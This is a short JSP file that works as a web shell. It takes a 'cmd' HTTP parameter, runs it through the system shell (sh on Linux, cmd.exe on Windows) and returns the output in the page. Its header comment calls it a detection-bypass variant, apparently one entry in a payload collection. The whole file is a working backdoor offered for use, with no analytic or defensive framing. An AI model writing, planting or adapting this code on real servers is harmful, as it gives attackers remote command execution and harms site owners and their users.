<%-- Bypass: Fragmentation of runtime strings --%>
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        String[] command = {"/bin/sh", "-c", cmd}; // Linux
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            command = new String[]{"cmd.exe", "/c", cmd}; // Windows
        }
        Process p = Runtime.getRuntime().exec(command);
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while (disr != null) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
%>


